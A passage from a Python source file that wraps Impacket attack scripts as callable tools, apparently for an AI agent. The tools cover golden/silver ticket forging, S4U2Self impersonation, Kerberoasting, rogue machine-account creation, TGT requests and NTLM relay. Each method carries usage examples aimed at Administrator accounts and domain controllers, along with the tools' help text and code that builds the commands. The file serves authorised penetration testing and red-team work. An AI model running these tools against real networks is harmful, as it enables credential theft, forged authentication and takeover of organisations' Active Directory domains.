                nthash="31d6cfe0d16ae931b73c59d7e0c089c0"
            )

            # Create silver ticket for CIFS service
            await impacket_ticketer(
                target_user="Administrator",
                domain="corp.local",
                domain_sid="S-1-5-21-123456789-123456789-123456789",
                nthash="31d6cfe0d16ae931b73c59d7e0c089c0",
                spn="cifs/dc01.corp.local"
            )

            # Create ticket using AES key with custom groups
            await impacket_ticketer(
                target_user="user",
                domain="corp.local",
                domain_sid="S-1-5-21-123456789-123456789-123456789",
                aes_key="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
                groups="513,512,520,518,519"
            )

        <documentation>
        Creates a Kerberos golden/silver tickets based on user options

        positional arguments:
        target                username for the newly created ticket

        options:
        -h, --help            show this help message and exit
        -spn SPN              SPN (service/server) of the target service the silver ticket will be generated for. if omitted, golden ticket will be created
        -request              Requests ticket to domain and clones it changing only the supplied information. It requires specifying -user
        -domain DOMAIN        the fully qualified domain name (e.g. contoso.com)
        -domain-sid DOMAIN_SID
                                Domain SID of the target domain the ticker will be generated for
        -aesKey hex key       AES key used for signing the ticket (128 or 256 bits)
        -nthash NTHASH        NT hash used for signing the ticket
        -keytab KEYTAB        Read keys for SPN from keytab file (silver ticket only)
        -groups GROUPS        comma separated list of groups user will belong to (default = 513, 512, 520, 518, 519)
        -user-id USER_ID      user id for the user the ticket will be created for (default = 500)
        -extra-sid EXTRA_SID  Comma separated list of ExtraSids to be included inside the ticket's PAC
        -extra-pac            Populate your ticket with extra PAC (UPN_DNS)
        -old-pac              Use the old PAC structure to create your ticket (exclude PAC_ATTRIBUTES_INFO and PAC_REQUESTOR
        -duration DURATION    Amount of hours till the ticket expires (default = 24*365*10)
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -impersonate IMPERSONATE
                                Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U) for querying the ST and extracting the PAC,
                                which will be included in the new ticket

        authentication:
        -user USER            domain/username to be used if -request is chosen (it can be different from domain/username
        -password PASSWORD    password for domain/username
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
        </documentation>

        Args:
            target_user: Username for the newly created ticket (required).
            domain: Fully qualified domain name (required).
            domain_sid: Domain SID (required).
            nthash: NT hash for signing the ticket.
            aes_key: AES key for signing the ticket (128 or 256 bits).
            keytab: Read keys for SPN from keytab file (silver ticket only).
            spn: SPN for silver ticket (omit for golden ticket).
            groups: Comma-separated list of group IDs (default: 513,512,520,518,519).
            user_id: User RID for the ticket (default: 500).
            extra_sid: Comma-separated list of extra SIDs for PAC.
            extra_pac: Populate ticket with extra PAC (UPN_DNS).
            old_pac: Use old PAC structure.
            duration: Hours until ticket expires (default: 87600 = 10 years).
            impersonate: Target username for Sapphire ticket (S4U2Self+U2U).
            request: Request ticket from domain and clone it (requires request_user).
            request_user: Domain/username for -request mode.
            request_password: Password for -request mode.
            request_hashes: NTLM hashes for -request mode.
            dc_ip: Domain controller IP address (for -request mode).
            env: Optional environment variables (e.g., KRB5CCNAME).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not nthash and not aes_key and not keytab:
            raise ValueError(
                "Must provide at least one signing key: nthash, aes_key, or keytab"
            )

        if request and not request_user:
            raise ValueError("request_user is required when request=True")

        # Build command - positional argument first
        args = []

        if nthash:
            args.extend(["-nthash", nthash])

        if aes_key:
            args.extend(["-aesKey", aes_key])

        if keytab:
            args.extend(["-keytab", keytab])

        args.extend(["-domain", domain])
        args.extend(["-domain-sid", domain_sid])

        if spn:
            args.extend(["-spn", spn])

        if groups:
            args.extend(["-groups", groups])

        if user_id is not None:
            args.extend(["-user-id", str(user_id)])

        if extra_sid:
            args.extend(["-extra-sid", extra_sid])

        if extra_pac:
            args.append("-extra-pac")

        if old_pac:
            args.append("-old-pac")

        if duration is not None:
            args.extend(["-duration", str(duration)])

        if impersonate:
            args.extend(["-impersonate", impersonate])

        if request:
            args.append("-request")

        # Request authentication options
        if request_user:
            args.extend(["-user", request_user])

        if request_password:
            args.extend(["-password", request_password])

        if request_hashes:
            args.extend(["-hashes", request_hashes])

        if dc_ip:
            args.extend(["-dc-ip", dc_ip])

        # Target user is positional - must be last
        args.append(target_user)

        return await execute(
            self._build_script_command("ticketer.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_get_st(
        self,
        *,
        spn: str,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        impersonate: str | None = None,
        additional_ticket: str | None = None,
        altservice: str | None = None,
        u2u: bool = False,
        self_only: bool = False,
        force_forwardable: bool = False,
        renew: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket getST.py to request a Service Ticket.

        Requests Kerberos service tickets, supports S4U2Self/S4U2Proxy for delegation attacks.

        Authentication:
            At least one of (password, hashes, kerberos) must be provided.
            Domain and username are required unless using Kerberos with KRB5CCNAME.

        Usage Examples:
            # Request service ticket using password
            await impacket_get_st(
                spn="cifs/fileserver.corp.local",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # S4U2Self attack to impersonate admin using hash
            await impacket_get_st(
                spn="http/webapp.corp.local",
                domain="corp.local",
                username="serviceaccount",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                impersonate="Administrator"
            )

            # Request ST with additional ticket for RBCD
            await impacket_get_st(
                spn="cifs/target.corp.local",
                domain="corp.local",
                username="attacker",
                password="Password123",
                impersonate="Administrator",
                additional_ticket="attacker.ccache"
            )

        <documentation>
        Given a password, hash or aesKey, it will request a Service Ticket and save it as ccache

        positional arguments:
        identity              [domain/]username[:password]

        options:
        -h, --help            show this help message and exit
        -spn SPN              SPN (service/server) of the target service the service ticket will be generated for
        -altservice ALTSERVICE
                                New sname/SPN to set in the ticket
        -impersonate IMPERSONATE
                                target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the
                                identity provided in this scripts is allowed for delegation to the SPN specified
        -additional-ticket ticket.ccache
                                include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -u2u                  Request User-to-User ticket
        -self                 Only do S4U2self, no S4U2proxy
        -force-forwardable    Force the service ticket obtained through S4U2Self to be forwardable. For best results, the -hashes and -aesKey values
                                for the specified -identity should be provided. This allows impresonation of protected users and bypass of "Kerberos-
                                only" constrained delegation restrictions. See CVE-2020-17049
        -renew                Sets the RENEW ticket option to renew the TGT used for authentication. Set -spn to 'krbtgt/DOMAINFQDN'

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid
                                credentials cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -dc-ip ip address     IP Address of the domain controller. If omitted it use the domain part (FQDN) specified in the target parameter
        </documentation>

        Args:
            spn: SPN (service/server) of target service (required).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            impersonate: Target username to impersonate (S4U2Self).
            additional_ticket: Path to forwardable ticket for S4U2Proxy (RBCD+KCD).
            altservice: New sname/SPN to set in the ticket.
            u2u: Request User-to-User ticket.
            self_only: Only do S4U2Self, no S4U2Proxy.
            force_forwardable: Force forwardable ticket (CVE-2020-17049).
            renew: Renew TGT (set spn to 'krbtgt/DOMAINFQDN').
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not (password or hashes or kerberos):
            raise ValueError(
                "Must provide at least one authentication method: password, hashes, or kerberos"
            )

        # Build identity
        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if not identity and not kerberos:
            raise ValueError(
                "Must provide domain/username unless using Kerberos authentication"
            )

        # Build command
        args = []
        if identity:
            args.append(identity)

        args.extend(["-spn", spn])

        if impersonate:
            args.extend(["-impersonate", impersonate])

        if additional_ticket:
            args.extend(["-additional-ticket", additional_ticket])

        if altservice:
            args.extend(["-altservice", altservice])

        if u2u:
            args.append("-u2u")

        if self_only:
            args.append("-self")

        if force_forwardable:
            args.append("-force-forwardable")

        if renew:
            args.append("-renew")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("getST.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_get_user_spns(
        self,
        *,
        domain: str,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        dc_host: str | None = None,
        target_domain: str | None = None,
        request: bool = False,
        request_user: str | None = None,
        outputfile: str | None = None,
        save: bool = False,
        usersfile: str | None = None,
        no_preauth: str | None = None,
        stealth: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket GetUserSPNs.py to query for Kerberoastable accounts.

        Finds user accounts with SPNs set and optionally requests their service tickets for offline cracking.

        Usage Examples:
            # List all SPNs with password authentication
            await impacket_get_user_spns(
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Request Kerberoastable hashes and save to file
            await impacket_get_user_spns(
                domain="corp.local",
                username="user",
                password="Password123",
                request=True,
                outputfile="kerberoast_hashes.txt"
            )

            # Kerberoast using NTLM hash with domain controller specified
            await impacket_get_user_spns(
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                request=True,
                dc_ip="10.0.0.1"
            )

        <documentation>
        Queries target domain for SPNs that are running under a user account

        positional arguments:
        target                domain[/username[:password]]

        options:
        -h, --help            show this help message and exit
        -target-domain TARGET_DOMAIN
                                Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.
        -no-preauth NO_PREAUTH
                                account that does not require preauth, to obtain Service Ticket through the AS
        -stealth              Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. May cause huge memory consumption / errors
                                on large domains.
        -usersfile USERSFILE  File with user per line to test
        -request              Requests TGS for users and output them in JtR/hashcat format (default False)
        -request-user username
                                Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
        -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request
        -outputfile OUTPUTFILE
                                Output filename to write ciphers in JtR/hashcat format. Auto selects -request
        -ts                   Adds timestamp to every logging output.
        -debug                Turn DEBUG output ON

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

        connection:
        -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter. Ignoredif
                                -target-domain is specified.
        -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
        </documentation>

        Args:
            domain: Domain name (required).
            username: Username for authentication (optional for anonymous queries).
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            dc_host: Domain controller hostname override.
            target_domain: Query different domain (for cross-trust Kerberoasting).
            request: Request TGS tickets and output in hashcat/JtR format.
            request_user: Request TGS for specific user only (username without domain).
            outputfile: Output filename for hashes (auto-enables request).
            save: Save TGS tickets to disk as .ccache files (auto-enables request).
            usersfile: File with one username per line to test.
            no_preauth: Account without preauth to obtain tickets through AS.
            stealth: Remove servicePrincipalName filter for stealth (high memory usage).
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build domain-first identity
        identity = self._build_domain_first_identity(
            domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if target_domain:
            args.extend(["-target-domain", target_domain])

        if request:
            args.append("-request")

        if request_user:
            args.extend(["-request-user", request_user])

        if outputfile:
            args.extend(["-outputfile", outputfile])

        if save:
            args.append("-save")

        if usersfile:
            args.extend(["-usersfile", usersfile])

        if no_preauth:
            args.extend(["-no-preauth", no_preauth])

        if stealth:
            args.append("-stealth")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, dc_host=dc_host))

        return await execute(
            self._build_script_command("GetUserSPNs.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_add_computer(
        self,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        dc_host: str | None = None,
        computer_name: str | None = None,
        computer_pass: str | None = None,
        domain_netbios: str | None = None,
        method: str | None = None,
        port: int | None = None,
        base_dn: str | None = None,
        computer_group: str | None = None,
        no_add: bool = False,
        delete: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket addcomputer.py to add a computer account to the domain.

        Adds machine accounts using SAMR (over SMB) or LDAPS protocols.

        Authentication:
            At least one of (password, hashes, kerberos) must be provided.
            Domain and username are required unless using Kerberos with KRB5CCNAME.

        Usage Examples:
            # Add computer with random name and password
            await impacket_add_computer(
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Add computer with specific name and password
            await impacket_add_computer(
                domain="corp.local",
                username="user",
                password="Password123",
                computer_name="ATTACKER$",
                computer_pass="P@ssw0rd123!"
            )

            # Add computer using NTLM hash via LDAPS
            await impacket_add_computer(
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                method="LDAPS",
                computer_name="EVIL$"
            )

        <documentation>
        Adds a computer account to domain

        positional arguments:
        [domain/]username[:password]
                                Account used to authenticate to DC.

        options:
        -h, --help            show this help message and exit
        -domain-netbios NETBIOSNAME
                                Domain NetBIOS name. Required if the DC has multiple domains.
        -computer-name COMPUTER-NAME$
                                Name of computer to add.If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
        -computer-pass password
                                Password to set to computerIf omitted, a random [A-Za-z0-9]{32} will be used.
        -no-add               Don't add a computer, only set password on existing one.
        -delete               Delete an existing computer.
        -debug                Turn DEBUG output ON
        -method {SAMR,LDAPS}  Method of adding the computer.SAMR works over SMB.LDAPS has some certificate requirementsand isn't always available.
        -port {139,445,636}   Destination port to connect to. SAMR defaults to 445, LDAPS to 636.

        LDAP:
        -baseDN DC=test,DC=local
                                Set baseDN for LDAP.If ommited, the domain part (FQDN) specified in the account parameter will be used.
        -computer-group CN=Computers,DC=test,DC=local
                                Group to which the account will be added.If omitted, CN=Computers will be used,

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters. If valid
                                credentials cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
        -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.specified in the account parameter will be used
        </documentation>

        Args:
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            dc_host: Domain controller hostname override.
            computer_name: Name for new computer (default: random DESKTOP-[A-Z0-9]{8}).
            computer_pass: Password for new computer (default: random 32 chars).
            domain_netbios: Domain NetBIOS name (required if DC has multiple domains).
            method: Method to use - 'SAMR' or 'LDAPS' (default: SAMR).
            port: Destination port (SAMR: 445, LDAPS: 636).
            base_dn: Base DN for LDAP operations.
            computer_group: Group DN to add computer to (default: CN=Computers).
            no_add: Don't add computer, only set password on existing one.
            delete: Delete an existing computer instead of adding.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not (password or hashes or kerberos):
            raise ValueError(
                "Must provide at least one authentication method: password, hashes, or kerberos"
            )

        # Build identity
        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if not identity and not kerberos:
            raise ValueError(
                "Must provide domain/username unless using Kerberos authentication"
            )

        # Build command
        args = []
        if identity:
            args.append(identity)

        if computer_name:
            args.extend(["-computer-name", computer_name])

        if computer_pass:
            args.extend(["-computer-pass", computer_pass])

        if domain_netbios:
            args.extend(["-domain-netbios", domain_netbios])

        if method:
            args.extend(["-method", method])

        if port is not None:
            args.extend(["-port", str(port)])

        if base_dn:
            args.extend(["-baseDN", base_dn])

        if computer_group:
            args.extend(["-computer-group", computer_group])

        if no_add:
            args.append("-no-add")

        if delete:
            args.append("-delete")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, dc_host=dc_host))

        return await execute(
            self._build_script_command("addcomputer.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_get_tgt(
        self,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        service: str | None = None,
        principal_type: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket getTGT.py to request a Ticket Granting Ticket.

        Requests a TGT from the KDC and saves it as a ccache file.

        Authentication:
            At least one of (password, hashes, kerberos) must be provided.
            Domain and username are required unless using Kerberos with KRB5CCNAME.

        Usage Examples:
            # Request TGT using password (saves to username.ccache)
            await impacket_get_tgt(
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Request TGT using NTLM hash
            await impacket_get_tgt(
                domain="corp.local",
                username="administrator",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                dc_ip="10.0.0.1"
            )

            # Request TGT using AES key
            await impacket_get_tgt(
                domain="corp.local",
                username="user",
                aes_key="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
                dc_ip="10.0.0.1"
            )

        <documentation>
        Given a password, hash or aesKey, it will request a TGT and save it as ccache

        positional arguments:
        identity              [domain/]username[:password]

        options:
        -h, --help            show this help message and exit
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
        -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
        -service SPN          Request a Service Ticket directly through an AS-REQ
        -principalType [PRINCIPALTYPE]
                                PrincipalType of the token, can be one of NT_UNKNOWN, NT_PRINCIPAL, NT_SRV_INST, NT_SRV_HST, NT_SRV_XHST, NT_UID,
                                NT_SMTP_NAME, NT_ENTERPRISE, NT_WELLKNOWN, NT_SRV_HST_DOMAIN, NT_MS_PRINCIPAL, NT_MS_PRINCIPAL_AND_ID,
                                NT_ENT_PRINCIPAL_AND_ID; default is NT_PRINCIPAL,
        </documentation>

        Args:
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            service: Request Service Ticket directly through AS-REQ.
            principal_type: PrincipalType (default: NT_PRINCIPAL).
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not (password or hashes or kerberos):
            raise ValueError(
                "Must provide at least one authentication method: password, hashes, or kerberos"
            )

        # Build identity
        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if not identity and not kerberos:
            raise ValueError(
                "Must provide domain/username unless using Kerberos authentication"
            )

        # Build command
        args = []
        if identity:
            args.append(identity)

        if service:
            args.extend(["-service", service])

        if principal_type:
            args.extend(["-principalType", principal_type])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("getTGT.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True, variants=["all", "relay"])
    async def impacket_ntlmrelayx(
        self,
        *,
        target: str | None = None,
        targets_file: str | None = None,
        smb2support: bool = False,
        socks: bool = False,
        interface_ip: str | None = None,
        smb_port: int | None = None,
        http_port: str | None = None,
        exec_command: str | None = None,
        interactive: bool = False,
        lootdir: str | None = None,
        output_file: str | None = None,
        dump_hashes: bool = False,
        escalate_user: str | None = None,
        delegate_access: bool = False,
        dump_laps: bool = False,
        dump_gmsa: bool = False,
        dump_adcs: bool = False,
        add_computer: str | None = None,
        no_dump: bool = False,
        no_da: bool = False,
        no_acl: bool = False,
        adcs: bool = False,
        template: str | None = None,
        altname: str | None = None,
        shadow_credentials: bool = False,
        shadow_target: str | None = None,
        remove_mic: bool = False,
        no_smb_server: bool = False,
        no_http_server: bool = False,
        no_wcf_server: bool = False,
        no_raw_server: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket ntlmrelayx.py to perform NTLM relay attacks.

        This is a relay server that requires NO authentication - it relays incoming NTLM authentication.

        Usage Examples:
            # Basic SMB relay to dump SAM
            await impacket_ntlmrelayx(
                target="smb://192.168.1.10",
                smb2support=True
            )

            # LDAP relay for privilege escalation
            await impacket_ntlmrelayx(
                target="ldap://dc01.corp.local",
                smb2support=True,
                escalate_user="attacker"
            )

            # Relay to multiple targets with SOCKS proxy
            await impacket_ntlmrelayx(
                targets_file="targets.txt",
                smb2support=True,
                socks=True
            )

        <documentation>
        For every connection received, this module will try to relay that connection to specified target(s) system or the original client

        Main options:
        -h, --help            show this help message and exit
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -t, --target TARGET   Target to relay the credentials to, can be an IP, hostname or URL like domain\username@host:port (domain\username and port
                                are optional, and don't forget to escape the '\'). If unspecified, it will relay back to the client')
        -tf TARGETSFILE       File that contains targets by hostname or full URL, one per line
        -w                    Watch the target file for changes and update target list automatically (only valid with -tf)
        -i, --interactive     Launch an smbclient, LDAP console or SQL shell insteadof executing a command after a successful relay. This console will
                                listen locally on a tcp port and can be reached with for example netcat.
        -ip, --interface-ip INTERFACE_IP
                                IP address of interface to bind SMB and HTTP servers
        --smb-port SMB_PORT   Port to listen on smb server
        --http-port HTTP_PORT
                                Port(s) to listen on HTTP server. Can specify multiple ports by separating them with `,`, and ranges with `-`. Ex:
                                `80,8000-8010`
        --wcf-port WCF_PORT   Port to listen on wcf server
        --raw-port RAW_PORT   Port to listen on raw server
        --no-multirelay       If set, disable multi-host relay (SMB and HTTP servers)
        --keep-relaying       If set, keeps relaying to a target even after a successful connection on it
        -ra, --random         Randomize target selection
        -r SMBSERVER          Redirect HTTP requests to a file:// path on SMBSERVER
        -l, --lootdir LOOTDIR
                                Loot directory in which gathered loot such as SAM dumps will be stored (default: current directory).
        -of, --output-file OUTPUT_FILE
                                base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2
        -dh, --dump-hashes    show encrypted hashes in the console
        -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target,
                                map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute ntlmrelayx.py again
                                with -codec and the corresponding codec
        -smb2support          SMB2 Support
        -ntlmchallenge NTLMCHALLENGE
                                Specifies the NTLM server challenge used by the SMB Server (16 hex bytes long. eg: 1122334455667788)
        -socks                Launch a SOCKS proxy for the connection relayed
        -socks-address SOCKS_ADDRESS
                                SOCKS5 server address (also used for HTTP API)
        -socks-port SOCKS_PORT
                                SOCKS5 server port
        -http-api-port HTTP_API_PORT
                                SOCKS5 HTTP API port
        -wh, --wpad-host WPAD_HOST
                                Enable serving a WPAD file for Proxy Authentication attack, setting the proxy host to the one supplied.
        -wa, --wpad-auth-num WPAD_AUTH_NUM
                                Prompt for authentication N times for clients without MS16-077 installed before serving a WPAD file. (default=1)
        -6, --ipv6            Listen on both IPv6 and IPv4
        --remove-mic          Remove MIC (exploit CVE-2019-1040)
        --serve-image SERVE_IMAGE
                                local path of the image that will we returned to clients
        -c COMMAND            Command to execute on target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must
                                be in the same directory). For RPC no output will be provided.

        --no-smb-server       Disables the SMB server
        --no-http-server      Disables the HTTP server
        --no-wcf-server       Disables the WCF server
        --no-raw-server       Disables the RAW server

        SMB client options:
        -e FILE               File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)
        --enum-local-admins   If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)

        RPC client options:
        -rpc-mode {TSCH}      Protocol to attack, only TSCH supported
        -rpc-use-smb          Relay DCE/RPC to SMB pipes
        -auth-smb [domain/]username[:password]
                                Use this credential to authenticate to SMB (low-privilege account)
        -hashes-smb LMHASH:NTHASH
        -rpc-smb-port {139,445}
                                Destination port to connect to SMB

        MSSQL client options:
        -q, --query QUERY     MSSQL query to execute(can specify multiple)

        HTTP options:
        -machine-account MACHINE_ACCOUNT
                                Domain machine account to use when interacting with the domain to grab a session key for signing, format is
                                domain/machine_name
        -machine-hashes LMHASH:NTHASH
                                Domain machine hashes, format is LMHASH:NTHASH
        -domain DOMAIN        Domain FQDN or IP to connect using NETLOGON
        -remove-target        Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)

        LDAP client options:
        --no-dump             Do not attempt to dump LDAP information
        --no-da               Do not attempt to add a Domain Admin
        --no-acl              Disable ACL attacks
        --no-validate-privs   Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks
        --escalate-user ESCALATE_USER
                                Escalate privileges of this user instead of creating a new one
        --delegate-access     Delegate access on relayed computer account to the specified account
        --sid                 Use a SID to delegate access rather than an account name
        --dump-laps           Attempt to dump any LAPS passwords readable by the user
        --dump-gmsa           Attempt to dump any gMSA passwords readable by the user
        --dump-adcs           Attempt to dump ADCS enrollment services and certificate templates info
        --add-dns-record NAME IPADDR
                                Add the <NAME> record to DNS via LDAP pointing to <IPADDR>

        Common options for SMB and LDAP:
        --add-computer [COMPUTERNAME [PASSWORD ...]]
                                Attempt to add a new computer account via SMB or LDAP, depending on the specified target. This argument can be used either
                                with the LDAP or the SMB service, as long as the target is a domain controller.

        IMAP client options:
        -k, --keyword KEYWORD
                                IMAP keyword to search for. If not specified, will search for mails containing "password"
        -m, --mailbox MAILBOX
                                Mailbox name to dump. Default: INBOX
        -a, --all             Instead of searching for keywords, dump all emails
        -im, --imap-max IMAP_MAX
                                Max number of emails to dump (0 = unlimited, default: no limit)

        AD CS attack options:
        --adcs                Enable AD CS relay attack
        --template TEMPLATE   AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require
                                specifying `DomainController`
        --altname ALTNAME     Subject Alternative Name to use when performing ESC1 or ESC6 attacks.

        Shadow Credentials attack options:
        --shadow-credentials  Enable Shadow Credentials relay attack (msDS-KeyCredentialLink manipulation for PKINIT pre-authentication)
        --shadow-target SHADOW_TARGET
                                target account (user or computer$) to populate msDS-KeyCredentialLink from
        --pfx-password PFX_PASSWORD
                                password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)
        --export-type {PEM,PFX}
                                choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))
        --cert-outfile-path CERT_OUTFILE_PATH
                                filename to store the generated self-signed PEM or PFX certificate and key

        SCCM Policies attack options:
        --sccm-policies       Enable SCCM policies attack. Performs SCCM secret policies dump from a Management Point by registering a device. Works best
                                when relaying a machine account. Expects as target 'http://<MP>/ccm_system_windowsauth/request'
        --sccm-policies-clientname SCCM_POLICIES_CLIENTNAME
                                The name of the client that will be registered in order to dump secret policies. Defaults to the relayed account's name
        --sccm-policies-sleep SCCM_POLICIES_SLEEP
                                The number of seconds to sleep after the client registration before requesting secret policies

        SCCM Distribution Point attack options:
        --sccm-dp             Enable SCCM Distribution Point attack. Perform package file dump from an SCCM Distribution Point. Expects as target
                                'http://<DP>/sms_dp_smspkg$/Datalib'
        --sccm-dp-extensions SCCM_DP_EXTENSIONS
                                A custom list of extensions to look for when downloading files from the SCCM Distribution Point. If not provided, defaults to
